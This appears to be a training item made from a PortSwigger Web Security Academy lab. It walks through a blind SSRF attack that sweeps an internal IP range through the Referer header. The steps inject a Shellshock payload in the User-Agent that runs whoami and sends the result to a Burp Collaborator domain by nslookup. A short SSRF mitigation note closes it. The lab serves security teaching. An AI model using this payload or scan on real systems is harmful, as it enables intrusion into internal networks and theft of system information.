# SSRF — portswigger_labs_sft

- source: portswigger_labs_sft
- class: ssrf
- cwe: CWE-918

## Scenario

Scenario framing — PortSwigger "Blind SSRF with Shellshock exploitation" (Server-side request forgery (SSRF), Expert):
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

Note

 To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

What are the exact steps to solve this lab?

## Analysis / Response

This PortSwigger Web Security Academy lab (Expert) covers Server-side request forgery (SSRF): "Blind SSRF with Shellshock exploitation".

## Solution steps

1. In Burp Suite Professional, install the Collaborator Everywhere extension from the BApp Store.
2. Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
3. Browse the site.
4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the `Referer` header.
5. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
6. Send the request to the product page to Burp Intruder.
7. Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload: `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
8. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
9. Change the `Referer` header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click Add §.
10. In the Payloads side panel, change the payload type to Numbers, and enter 1, 255, and 1 in the From and To and Step boxes respectively.
11. Click Start attack.
12. When the attack is finished, go to the Collaborator tab, and click Poll now. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
13. To complete the lab, enter the name of the OS user.

## Vulnerability note

Underlying issue: Server-side request forgery (SSRF) (CWE-918). Block requests to internal/metadata IPs, use allowlists for outbound destinations, and avoid passing raw URLs to server-side fetchers.
